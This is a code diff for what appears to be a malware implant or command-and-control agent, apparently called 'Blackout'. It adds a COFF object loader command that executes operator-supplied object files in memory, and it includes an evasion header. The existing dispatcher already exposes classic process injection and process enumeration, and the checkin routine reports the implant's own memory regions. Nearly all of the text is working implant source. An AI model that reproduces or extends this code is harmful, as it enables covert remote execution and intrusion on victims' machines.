@@ -1,4 +1,5 @@
 #include <common.h>
+#include <evasion.h>
 
 FUNC VOID CommandDispatcher(
     void
@@ -14,6 +15,7 @@ FUNC VOID CommandDispatcher(
     Instance()->Commands[ 6 ] = { .ID = COMMAND_EXITT,    .Function = CommandExitThread };
     Instance()->Commands[ 7 ] = { .ID = COMMAND_CLASSIC,  .Function = CommandClassicInjection };
     Instance()->Commands[ 8 ] = { .ID = COMMAND_PROCLIST, .Function = CommandProcEnum };
+    Instance()->Commands[ 9 ] = { .ID = CMD_COFFLOADER,   .Function = CmdCoffLoader };
 
     PPACKAGE Package     = NULL;
     PARSER   Parser      = { 0 };
@@ -234,6 +236,20 @@ FUNC VOID CommandExplorer(
     }
 }
 
+FUNC VOID CmdCoffLoader(
+    PPARSER Parser
+) {
+    UINT32 ObjectSize = 0;
+    PBYTE  ObjectAddr = ParserGetBytes( Parser, &ObjectSize );
+    //PSTR   Args       = ParserGetString( Parser, NULL );
+
+    BK_PRINT( "coff @ 0x%p [%d bytes]\n", ObjectAddr, ObjectSize );
+
+    CoffLdr( ObjectAddr, "go", 0, 0 );
+
+    return;
+}
+
 FUNC VOID CommandProcEnum(
     _In_ PPARSER Parser
 ) {
@@ -264,7 +280,8 @@ FUNC VOID CommandProcEnum(
         PackageTransmitError( Err );
         return;
     }
-    
+
+
     Spi = (PSYSTEM_PROCESS_INFORMATION)( U_PTR(Spi) + Spi->NextEntryOffset );        
 
     while ( 1 ) {
@@ -309,7 +326,7 @@ FUNC VOID CommandCheckin(
     PackageAddInt64( BK_PACKAGE, Blackout().Region.Base      );
     PackageAddInt64( BK_PACKAGE, Blackout().Region.Length    );
     PackageAddInt64( BK_PACKAGE, Blackout().RxRegion.Base    );
-    PackageAddInt32( BK_PACKAGE, Blackout().RxRegion.Length  );
+    PackageAddInt64( BK_PACKAGE, Blackout().RxRegion.Length  );
 
     PackageAddWString( BK_PACKAGE, Instance()->Session.ProcessName     );
     PackageAddWString( BK_PACKAGE, Instance()->Session.ProcessFullPath );
